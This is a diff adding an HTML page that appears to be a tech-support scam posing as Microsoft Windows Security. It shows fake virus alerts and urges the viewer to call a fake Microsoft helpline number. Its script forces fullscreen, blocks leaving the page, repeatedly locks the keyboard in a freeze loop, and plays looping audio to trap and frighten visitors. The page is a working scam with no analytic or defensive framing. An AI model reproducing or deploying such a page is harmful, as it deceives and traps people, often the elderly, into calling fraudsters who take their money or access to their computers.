@@ -1,0 +1,869 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <title>Service Center </title>
+  <link rel="shortcut icon" href="/Favicon.png">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700&display=swap');
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    body {
+      background: url('bg-image.jpeg') no-repeat;
+      background-size: inherit;
+      height: auto;
+      margin: 0;
+      padding: 0;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: none;
+      z-index: 99999;
+    }
+
+    .container {
+      width: 100%;
+      height: 100vh;
+      display: flex;
+      align-items: start;
+    }
+
+    .btn {
+      padding: 10px 60px;
+      background: #fff;
+      border: 0;
+      outline: none;
+      cursor: pointer;
+      font-size: 22px;
+      font-weight: 500;
+      transition: transform 0.2s;
+    }
+
+    .btn:active {
+      transform: scale(0.95);
+    }
+
+    .popup {
+      z-index: 1000;
+      width: 400px;
+      background: #fff;
+      position: absolute;
+      top: 0;
+      left: 50%;
+      transform: translate(-50%, -50%) scale(0.1);
+      text-align: start;
+      padding: 10px 10px;
+      color: #333;
+      visibility: hidden;
+      transition: all 0.4s ease-in-out;
+      border: 1px solid black;
+      display: none;
+    }
+
+    .popup p {
+      font-size: 12px;
+      margin-top: 5px;
+
+    }
+
+    .open-popup {
+      visibility: visible;
+      top: 10%;
+      transform: translate(-50%, -50%) scale(1);
+      display: block;
+    }
+
+    .inputdiv {
+      display: flex;
+      align-items: center;
+      gap: 5px
+    }
+
+    #check {
+      margin: 10px 0;
+      font-size: 12px;
+    }
+
+    .button-div {
+      display: flex;
+      gap: 10px;
+      flex: 1 1 25%;
+      width: 100%;
+      justify-content: flex-end;
+      align-items: center;
+    }
+
+    .popup img {
+      width: 100px;
+      margin-top: -50px;
+      -webkit-border-radius: 50%;
+      -moz-border-radius: 50%;
+      border-radius: 50%;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+    }
+
+    .popup h2 {
+      font-size: 38px;
+      font-weight: 500;
+      margin: 10px 0 10px;
+    }
+
+    .btn1 {
+      margin-top: 10px;
+      padding: 5px 20px;
+      background-color: blue;
+      color: #fff;
+      border: 1px solid blue;
+      outline: none;
+      font-size: 12px;
+      box-shadow: 0 5px 5px rgba(0, 0, 0, 0.2);
+    }
+
+    .btn2 {
+      margin-top: 10px;
+      padding: 5px 20px;
+      background-color: white;
+      color: blue;
+      border: 1px solid blue;
+      outline: none;
+      font-size: 12px;
+      box-shadow: 0 5px 5px rgba(0, 0, 0, 0.2);
+    }
+
+    .para {
+      font-size: 16px;
+      line-height: 20px;
+      margin-top: 15px;
+    }
+
+    .m1 {
+      margin: 200px auto;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+    }
+
+    .modal {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .modal1 {
+      position: absolute;
+      top: 28%;
+      left: 32%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    @keyframes pulse {
+
+      0%,
+      100% {
+        transform: scale(1);
+        opacity: 1;
+      }
+
+      50% {
+        transform: scale(1.05);
+        opacity: 1;
+      }
+    }
+
+    .m2 {
+      border: none;
+      margin: 50px auto;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .modal2 {
+      border: none;
+      position: absolute;
+      top: 15%;
+      right: 32%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .modal-container2 {
+      border: 1px solid black;
+      border-radius: 10px;
+      height: 560px;
+      width: 340px;
+      margin-left: auto;
+      margin-right: auto;
+      background-color: #0078d4;
+      overflow: hidden;
+      display: flex;
+      justify-content: space-between;
+      flex-direction: column;
+      animation: pulse 1.5s ease-in-out infinite;
+      box-shadow: 0 15px 30px 0 rgba(#000, 0.25);
+
+      @media (max-width: 600px) {
+        width: 90%;
+      }
+    }
+
+    .highlight {
+      font-weight: bold;
+      font-size: 1.5em;
+      animation: blink 1s step-start infinite;
+    }
+
+    @keyframes blink {
+
+      0%,
+      100% {
+        opacity: 1;
+      }
+
+      50% {
+        opacity: 0;
+      }
+    }
+
+    .text-box {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+
+    .modal-container {
+      border: 1px solid black;
+      border-radius: 10px;
+      max-height: 90vh;
+      max-width: 750px;
+      margin-left: auto;
+      margin-right: auto;
+      background-color: #fff;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      box-shadow: 0 15px 30px 0 rgba(#000, 0.25);
+
+      @media (max-width: 600px) {
+        width: 90%;
+      }
+    }
+
+    .modal-container1 {
+      border: 1px solid black;
+      border-radius: 10px;
+      max-height: 90vh;
+      width: 450px;
+      margin-left: auto;
+      margin-right: auto;
+      background-color: #fff;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      box-shadow: 0 15px 30px 0 rgba(#000, 0.25);
+
+      @media (max-width: 600px) {
+        width: 90%;
+      }
+    }
+
+    .micrologo {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-direction: row;
+      gap: 10px
+    }
+
+    .modal-container-header {
+      padding-left: 20px;
+      border-bottom: 1px solid #ddd;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .modal-container-header1 {
+      padding: 20px 40px;
+      border-bottom: 1px solid #ddd;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .modal-container-title {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      line-height: 1;
+      font-weight: 500;
+      font-size: 1;
+
+      svg {
+        width: 32px;
+        height: 32px;
+        color: #0078d4;
+      }
+    }
+
+    .modal-container-body {
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      gap: 10px;
+      padding: 20px
+    }
+
+    .modal-container-footer {
+      padding: 20px 32px;
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      border-top: 1px solid #ddd;
+      gap: 12px;
+      position: relative;
+
+      &:after {
+        content: "";
+        display: block;
+        position: absolute;
+        top: -51px;
+        left: 24px;
+        right: 24px;
+        height: 50px;
+        flex-shrink: 0;
+        background-image: linear-gradient(to top, rgba(#fff, 0.75), transparent);
+        pointer-events: none;
+      }
+    }
+
+    .modal-container-footer1 {
+      padding: 0 32px;
+      display: flex;
+      bottom: 40px;
+      align-items: center;
+      justify-content: flex-end;
+      border-top: 1px solid #ddd;
+      gap: 12px;
+      position: relative;
+
+      &:after {
+        content: "";
+        display: block;
+        position: absolute;
+        top: -51px;
+        left: 24px;
+        right: 24px;
+        height: 50px;
+        flex-shrink: 0;
+        background-image: linear-gradient(to top, rgba(#fff, 0.75), transparent);
+        pointer-events: none;
+      }
+    }
+
+    .button {
+      padding: 12px 20px;
+      border-radius: 8px;
+      background-color: transparent;
+      border: 0;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.15s ease;
+
+      &.is-ghost {
+
+        &:hover,
+        &:focus {
+          background-color: #dfdad7;
+        }
+      }
+
+      &.is-primary {
+        background-color: #0078d4;
+        color: #fff;
+
+        &:hover,
+        &:focus {
+          background-color: #0078d4;
+        }
+      }
+    }
+
+    .button1 {
+      border: 1px solid white;
+      padding: 10px 20px;
+      border-radius: 8px;
+      background-color: transparent;
+      color: white;
+      width: 80px;
+    }
+
+    .icon-button {
+      gap: 10px;
+      padding: 0;
+      border: 0;
+      background-color: transparent;
+      width: 80px;
+      height: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      line-height: 1;
+      cursor: pointer;
+      border-radius: 8px;
+      transition: 0.15s ease;
+
+      svg {
+        width: 24px;
+        height: 24px;
+
+        &:hover,
+        &:focus {
+          background-color: #dfdad7;
+        }
+      }
+    }
+
+    .manage-settings {
+      color: rgb(101, 101, 236);
+      margin-top: 10px;
+      font-size: 14px;
+      font-weight: 600;
+    }
+
+    .footerbelow {
+      width: 100%;
+      height: 50px;
+      background-color: #0078d4;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      bottom: 5px;
+    }
+
+    .toll {
+      border: 1px solid white;
+      color: white;
+      margin-left: 10px;
+      font-weight: 700;
+      border-radius: 5px;
+    }
+
+    .scrolling-line {
+      position: absolute;
+      bottom: -20px;
+      left: 0;
+      width: 100%;
+      height: 20px;
+      background-color: grey;
+      overflow: hidden;
+    }
+
+    .scrolling-text {
+      font-size: 12px;
+      position: relative;
+      white-space: nowrap;
+      animation: scroll-left 38s linear infinite;
+      color: white;
+    }
+
+    @keyframes scroll-left {
+      0% {
+        transform: translateX(100%);
+      }
+
+      100% {
+        transform: translateX(-100%);
+      }
+    }
+
+    .modalleft {
+      display: block;
+      /* Show the modal by default */
+      position: fixed;
+      width: 250px;
+      bottom: 20px;
+      right: 20px;
+      background-color: white;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      z-index: 1000;
+      padding: 10px;
+    }
+
+    .modal-contentleft {
+      width: 100%;
+      display: flex;
+      gap: 10px;
+      position: relative;
+    }
+
+    .closeleft {
+      color: #aaa;
+      position: absolute;
+      top: 10px;
+      left: 15px;
+      font-size: 20px;
+      cursor: pointer;
+    }
+
+    .arrowleft {
+      width: 0;
+      height: 0;
+      border-left: 7px solid transparent;
+      border-right: 7px solid transparent;
+      border-top: 7px solid white;
+      bottom: -17px;
+      position: relative;
+      right: -25px;
+
+    }
+  </style>
+</head>
+
+<body>
+  <div id="overlay" class="overlay"></div>
+  <audio id="welcomeSound" src="voice.mp3" preload="auto" loop></audio>
+
+  <div class="container">
+
+    <!-- 1st Popup(Alert) -->
+    <div class="popup" id="popup" style="z-index: 1000;">
+      <img src="img/tick.png" alt="">
+      <p>Leave site?</p>
+      <p>Changes you made may not be saved</p>
+      <div class="inputdiv">
+        <input type="checkbox" class="inputcheckbox" id="check"></input>
+        <label for="check" id="check">Prevent this page from creating additional changes</label>
+
+      </div>
+      <div class="button-div">
+        <button type="button" class="btn1" id="leaveButton" onclick="closePopup()">Leave</button>
+        <button type="button" class="btn2" id="cancelButton" onclick="closePopup()">Cancel</button>
+      </div>
+    </div>
+
+    <!-- 2nd Popup -->
+    <div style="z-index: 10;">
+      <div class="modal">
+        <article class="modal-container">
+          <header class="modal-container-header">
+            <div class="micrologo">
+              <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0 0 48 48">
+                <path fill="#ff5722" d="M6 6H22V22H6z" transform="rotate(-180 14 14)"></path>
+                <path fill="#4caf50" d="M26 6H42V22H26z" transform="rotate(-180 34 14)"></path>
+                <path fill="#ffc107" d="M26 26H42V42H26z" transform="rotate(-180 34 34)"></path>
+                <path fill="#03a9f4" d="M6 26H22V42H6z" transform="rotate(-180 14 34)"></path>
+              </svg>
+              <p class="modal-container-title">Microsoft Windows Security</p>
+            </div>
+            <div class="icon-button">
+              <img width="16" height="16" src="https://img.icons8.com/color/48/minimize-window.png"
+                alt="minimize-window" />
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+                <path fill="none" d="M0 0h24v24H0z" />
+                <path fill="red"
+                  d="M12 10.586l4.95-4.95 1.414 1.414-4.95 4.95 4.95 4.95-1.414 1.414-4.95-4.95-4.95 4.95-1.414-1.414 4.95-4.95-4.95-4.95L7.05 5.636z" />
+              </svg>
+            </div>
+          </header>
+          <section class="modal-container-body rtf">
+            <img width="50" height="50" src="https://img.icons8.com/ios/50/228BE6/shield.png" alt="shield" />
+            <div>
+
+
+              <p class="para">
+                A Zero Trust security model gives the right people the right
+                access at the right time. Zero Trust security is based on three
+                principles: Reduce risk by explicitly verifying data points such
+                as user identity, location, and device health for every access
+                request, without exception When verified, give people and
+                devices access to only necessary resources for the necessary
+                amount of time Use continuous analytics to drive threat
+                detection and improve defenses For Windows 11, the Zero Trust
+                principle of verify explicitly applies to risks introduced by
+                both devices and people. Windows 11 provides chip-to-cloud
+                security, enabling IT administrators to implement strong
+                authorization and authentication processes with features like
+                Windows Hello for Business. IT administrators also gain
+                attestation and measurements for determining if a device meets
+                requirements and can be trusted.
+              </p>
+              <p class="para">
+                To help keep personal and business information protected and
+                private, Windows 11 has multiple layers of application security
+                that safeguard critical data and code integrity. Application
+                isolation and controls, code integrity, privacy controls, and
+                least-privilege principles enable developers to build in
+                security and privacy from the ground up.
+              </p>
+              <p class="manage-settings">Manage Microsoft Settings</p>
+
+            </div>
+
+          </section>
+        </article>
+      </div>
+    </div>
+
+    <!-- 3rd Popup -->
+    <div class="m1" style="z-index: 900;">
+      <div class="modal1">
+        <article class="modal-container1">
+          <header class="modal-container-header1">
+            <div class="micrologo">
+              <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0 0 48 48">
+                <path fill="#ff5722" d="M6 6H22V22H6z" transform="rotate(-180 14 14)"></path>
+                <path fill="#4caf50" d="M26 6H42V22H26z" transform="rotate(-180 34 14)"></path>
+                <path fill="#ffc107" d="M26 26H42V42H26z" transform="rotate(-180 34 34)"></path>
+                <path fill="#03a9f4" d="M6 26H22V42H6z" transform="rotate(-180 14 34)"></path>
+              </svg>
+              <p class="modal-container-title">
+                Microsoft Internet Security Alerts !
+              </p>
+            </div>
+          </header>
+          <section class="modal-container-body rtf">
+            <div class="text-box">
+              <p style="color: red;">App: adds.financetrack(2).dll</p>
+              <p style="color: red;">Threat Detected: <span class="highlight">100711</span> virus found!</p>
+              <div class="mod-lottie-left-img" style="height: 85px"><video style="object-fit: cover;" height="140px"
+                  width="240px" loop="loop" autoplay="autoplay" muted="muted">
+                  <source
+                    src="https://d1jj76g3lut4fe.cloudfront.net/processed/thumb/uKgK2m57n2eX78qFY6.mp4?Expires=1727083404&amp;Signature=CVXc-iYo1NvvjOvQGfdp3zlBU-Lmvs~ELa75eLI~VPI2w8i8XxvV38027hRY69cTpiyDUkoHuzKcW5vboiIsu4CwcMf2WQmOYjY1XH9c48PUQysasVf5-SlZy24XExRVnPC1akPtGZMjD2NkZmG6g3NH8OJn8fcS3bQsCS~CXUO8dJh2SCUH3aRb37eeyU8sRHvj9wbHhqqmnXa24UxWfXLIS6uUxS6e4MJZB0OWWF8eGUHVChaxrXwqaHwVXbg8skUBbsqyx3AkkV1i1BB8GpL~yMGSS~QVMxViPwfi-2p0U22gXGPjMaINOSNN8ZREGw-HzXx15zZ1xWyftQzsrQ__&amp;Key-Pair-Id=K2YEDJLVZ3XRI#t=0.001"
+                    type="video/mp4">
+                </video></div>
+              <p class="para">Access has been blocked ..</p>
+              <p class="manage-settings">
+                Contact Microsoft Helpline: +1-844-532-9292
+              </p>
+            </div>
+          </section>
+          <footer class="modal-container-footer">
+            <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0 0 48 48">
+              <path fill="#ff5722" d="M6 6H22V22H6z" transform="rotate(-180 14 14)"></path>
+              <path fill="#4caf50" d="M26 6H42V22H26z" transform="rotate(-180 34 14)"></path>
+              <path fill="#ffc107" d="M26 26H42V42H26z" transform="rotate(-180 34 34)"></path>
+              <path fill="#03a9f4" d="M6 26H22V42H6z" transform="rotate(-180 14 34)"></path>
+            </svg>
+            <p class="modal-container-title">
+              Microsoft Windows
+            </p>
+            <button class="button is-primary">Continue</button>
+          </footer>
+        </article>
+      </div>
+    </div>
+
+    <!-- 4th Popup -->
+    <div class="m2" style="z-index: 800;">
+      <div class="modal2">
+        <article class="modal-container2">
+          <section class="modal-container-body">
+            <div class="text-box">
+              <p style="color: white; font-size:10px;">Security and privacy depend on an operating system that guards
+                your system and information from the moment it starts up, providing fundamental chip-to-cloud
+                protection. Windows 11 is the most secure Windows yet with extensive security measures designed to help
+                keep you safe. These measures include built-in advanced encryption and data protection, robust network
+                and system security, and intelligent safeguards against ever-evolving threats.
+                Security and privacy depend on an operating system that guards your system
+              </p>
+            </div>
+          </section>
+          <footer class="modal-container-footer1">
+            <div class="button-div">
+              <button type="button" class="button1 is-primary" id="leaveButton" onclick="closePopup()">Cancel</button>
+              <button type="button" class="button1 is-primary" id="cancelButton" onclick="closePopup()">Ok</button>
+            </div>
+          </footer>
+        </article>
+      </div>
+    </div>
+
+    <div id="contactModal" class="modalleft">
+      <div class="modal-contentleft">
+        <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0 0 48 48">
+          <path fill="#ff5722" d="M6 6H22V22H6z" transform="rotate(-180 14 14)"></path>
+          <path fill="#4caf50" d="M26 6H42V22H26z" transform="rotate(-180 34 14)"></path>
+          <path fill="#ffc107" d="M26 26H42V42H26z" transform="rotate(-180 34 34)"></path>
+          <path fill="#03a9f4" d="M6 26H22V42H6z" transform="rotate(-180 14 34)"></path>
+        </svg>
+        <p style="font-weight: 500;">Microsoft Support</p>
+      </div>
+      <p style="padding-left: 30px;font-weight: 500;">+1-844-532-9292</p>
+      <div class="arrowleft"></div>
+    </div>
+
+
+  </div>
+
+  <footer class="footerbelow">
+    <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0 0 48 48">
+      <path fill="#ff5722" d="M6 6H22V22H6z" transform="rotate(-180 14 14)"></path>
+      <path fill="#4caf50" d="M26 6H42V22H26z" transform="rotate(-180 34 14)"></path>
+      <path fill="#ffc107" d="M26 26H42V42H26z" transform="rotate(-180 34 34)"></path>
+      <path fill="#03a9f4" d="M6 26H22V42H6z" transform="rotate(-180 14 34)"></path>
+    </svg>
+    <p class="modal-container-title">
+      Microsoft Windows:
+    </p>
+    <div class="toll">+1-844-532-9292(Toll free)</div>
+    <div class="scrolling-line">
+      <div class="scrolling-text">Security Note: Malware is known to steal information from your device and use your
+        identity to do malicious transaction.</div>
+    </div>
+
+  </footer>
+
+
+  <script>
+
+    document.getElementById('overlay').addEventListener('click', function () {
+      if (document.documentElement.requestFullscreen) {
+        document.documentElement.requestFullscreen();
+      } else if (document.documentElement.mozRequestFullScreen) { // Firefox
+        document.documentElement.mozRequestFullScreen();
+      } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari and Opera
+        document.documentElement.webkitRequestFullscreen();
+      } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
+        document.documentElement.msRequestFullscreen();
+      }
+    });
+
+    window.addEventListener("beforeunload", function (event) {
+      event.preventDefault();
+      event.returnValue = '';
+      document.getElementById('popup').style.display = 'block'
+    });
+
+    document.addEventListener("DOMContentLoaded", () => {
+      let popup = document.getElementById('popup');
+      let overlay = document.getElementById('overlay');
+      let leaveButton = document.getElementById('leaveButton');
+      let cancelButton = document.getElementById('cancelButton');
+
+      let freezeDuration = 15000;
+      let unfreezeDuration = 3000;
+      let isFrozen = false;
+
+      function openPopup() {
+        popup.classList.add('open-popup');
+        overlay.style.display = 'block';
+      }
+
+      function closePopup() {
+        if (!isFrozen) {
+          popup.classList.remove('open-popup');
+          overlay.style.display = 'none';
+        }
+      }
+
+      function freezeScreen() {
+        isFrozen = true;
+        overlay.style.display = 'block';
+        popup.classList.add('open-popup');
+        leaveButton.disabled = true;
+        cancelButton.disabled = true;
+        navigator.keyboard.lock()
+        setTimeout(unfreezeScreen, freezeDuration);
+      }
+
+      function unfreezeScreen() {
+        isFrozen = false;
+        overlay.style.display = 'none';
+        leaveButton.disabled = false;
+        cancelButton.disabled = false;
+        navigator.keyboard.unlock()
+
+        setTimeout(freezeScreen, unfreezeDuration);
+      }
+
+      setTimeout(() => {
+        openPopup();
+        freezeScreen();
+      }, 1000);
+
+      leaveButton.addEventListener('click', () => {
+        if (!isFrozen) {
+          closePopup();
+        }
+      });
+
+      cancelButton.addEventListener('click', () => {
+        closePopup();
+      });
+    });
+
+    function openPopup() {
+      const modal = document.querySelector('.m2');
+      const modalContent = modal.querySelector('.modal2');
+
+      modal.style.display = 'flex'; // Use flex to center the modal
+      modalContent.style.animation = 'scale-in 0.3s ease forwards';
+    }
+
+    function closePopup() {
+      const modal = document.querySelector('.m2');
+      const modalContent = modal.querySelector('.modal2');
+
+      modalContent.style.animation = 'scale-out 0.3s ease forwards';
+
+      modalContent.addEventListener('animationend', () => {
+        modal.style.display = 'none';
+      }, { once: true });
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+      const overlay = document.getElementById('overlay');
+      const audio = document.getElementById('welcomeSound');
+
+      // Function to handle click event on the overlay
+      overlay.addEventListener('click', () => {
+        audio.currentTime = 0; // Reset audio to start
+        audio.play().catch((error) => {
+          console.error("Audio playback failed:", error);
+        });
+      });
+
+      // Show the overlay
+      overlay.style.display = 'block';
+
+      // Optional: Hide the overlay after audio plays (if desired)
+      audio.addEventListener('ended', () => {
+        overlay.style.display = 'none';
+      });
+    });
+
+
+
+  </script>
+
+</body>
+
+</html>
